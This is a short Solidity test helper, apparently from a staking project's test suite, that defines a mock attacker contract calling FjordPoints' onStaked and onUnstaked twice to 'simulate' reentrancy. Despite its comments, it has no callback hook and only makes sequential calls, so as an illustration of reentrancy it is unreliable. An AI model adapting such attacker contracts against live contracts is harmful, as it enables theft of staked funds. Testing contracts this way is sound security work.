// SPDX-License-Identifier: MIT
pragma solidity =0.8.21;

import { FjordPoints } from "../../src/FjordPoints.sol";

contract ReentrancyAttackFjordPoints {
    FjordPoints public fjordPoints;
    address public victim;

    constructor(FjordPoints _fjordPoints) {
        fjordPoints = _fjordPoints;
    }

    // Simulate re-entrancy attack on onStaked
    function attackOnStake(uint256 amount) public {
        victim = msg.sender;
        fjordPoints.onStaked(address(this), amount); // Initial staking

        // Re-entrancy attack
        if (address(fjordPoints).balance >= amount) {
            fjordPoints.onStaked(address(this), amount);
        }
    }

    // Simulate re-entrancy attack on onUnstaked
    function attackOnUnstake(uint256 amount) public {
        victim = msg.sender;
        fjordPoints.onUnstaked(address(this), amount); // Initial unstaking

        // Re-entrancy attack
        if (address(fjordPoints).balance >= amount) {
            fjordPoints.onUnstaked(address(this), amount);
        }
    }
}
